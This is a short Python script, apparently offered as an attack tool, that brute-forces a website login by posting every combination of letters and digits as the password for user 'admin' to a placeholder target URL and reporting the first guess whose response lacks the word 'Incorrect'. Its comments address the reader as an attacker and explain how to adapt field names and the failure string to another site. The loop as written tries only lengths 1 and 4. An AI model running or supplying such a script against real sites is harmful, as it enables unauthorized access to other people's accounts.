import itertools
import requests
string = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

for length in(1, 4):
    for password in itertools.product(string, repeat=length):
        pw = ''.join(password)
        id = 'IdWhichYouAlreadyFined.'
        print(pw)
        packet = { 
            'id' : 'admin',#id is at <input type="text" name="id" style="width: 90"></td>
                           #                              HERE. ###Depending on the site you're trying to attack, maybe you should change id to other str.
            'pw' : pw,#same as id tag in line(11,12)
        }

        address = requests.post('LinkWhichYouWillAttack.', data=packet)
        if address.text.find('Incorrect') ==  -1:###Depending on the site you're trying to attack, 'Incorrect' will be changed.
            print("password is", pw, ".")
            exit()

#other example.
#for i in string:
#    for j in string:
#        for k in string:
#           for h in string:
#               print(i, j, k, h)

